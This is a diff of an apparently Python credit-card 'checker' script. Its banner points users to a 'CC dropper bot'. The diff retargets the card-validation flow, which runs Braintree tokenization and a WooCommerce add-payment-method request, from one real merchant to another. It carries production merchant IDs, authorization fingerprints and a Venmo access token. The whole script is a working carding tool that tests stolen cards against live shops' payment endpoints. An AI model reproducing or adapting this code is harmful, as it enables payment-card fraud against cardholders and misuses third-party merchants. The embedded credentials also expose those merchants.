@@ -126,7 +126,7 @@ def typewriter(text, speed=0.1):
         sys.stdout.flush()
         time.sleep(speed)
     print()
-message = f"{LIME}{BOLD}GO TO {WARNING}{UNDERLINE}B3 DROPPER BOT{ENDC} {LIME}AND CLICK ON START. ELSE WAIT,{ENDC} {WARNING}{BOLD}CODE WILL REDIRECT YOU 🤝{ENDC}"
+message = f"{LIME}{BOLD}GO TO {WARNING}{UNDERLINE}EMPTYSKILL CC DROPPER BOT{ENDC} {LIME}AND CLICK ON START. ELSE WAIT,{ENDC} {WARNING}{BOLD}CODE WILL REDIRECT YOU 🤝{ENDC}"
 
 #-------[CHECKER]-------#
 clear_terminal()
@@ -206,7 +206,7 @@ for y in y:
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': 'fb65aa9d-126c-482e-af69-b333a9308c7f',
+        'sessionId': '5072621e-1032-487f-975f-d3179579279c',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -253,9 +253,9 @@ for y in y:
     data = {
     'payment_method': 'braintree_cc',
     'braintree_cc_nonce_key': tok,
-    'braintree_cc_device_data': '{"device_session_id":"9c4c63221b7048f1cda725f5e6fc5eaa","fraud_merchant_id":null,"correlation_id":"fb65aa9d-126c-482e-af69-b333a930"}',
+    'braintree_cc_device_data': '',
     'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mzg0NjI2NjMsImp0aSI6IjYwZWZjMzlkLTY3MjItNDgyNC04NDY0LTU3Y2QyMjZjZmYzOCIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6e319.3fU4IjfKHnk7sG0n6ecl904BC6zDigHFD7ttyXsi7CtiSCawW_qw-AxeXA9nxCi4ZS_1jRBGo6-6dXuQFoOE5Q","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
+    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/zgmjz6bk4shsk2zd/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/zgmjz6bk4shsk2zd"},"merchantId":"zgmjz6bk4shsk2zd","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"zgmjz6bk4shsk2zd","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Uncle Jims Worm Farm","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mzg1NDA1OTMsImp0aSI6ImQzODVhM2FjLWM5YjgtNDUzYy05NjIyLTQxNDhhN2QzMGNjYyIsInN1YiI6InpnbWp6NmJrNHNoc2syemQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InpnbWp6NmJrNHNoc2syemQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.5aZkDzrrJMAbK12hDtWr80BOUWotxNzcAfiA40_rh8KqV3ihxY2_k16ANusUeycNdtBx9qGnF_GGRPCMHR2A4A","paypalClientId":"ATLxCsU3hyoXL6tIuU4X5FH4zBJ7BoD_-BTfhyHrYdFqbzLhqY7GIKNOrpCIPU4WDpdzZ3XUALu6971a","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3119910952783315598","accessToken":"access_token$production$zgmjz6bk4shsk2zd$c0462a05c55ebba64c943763ea0be348","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":false}',
     'woocommerce-add-payment-method-nonce': nonce,
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
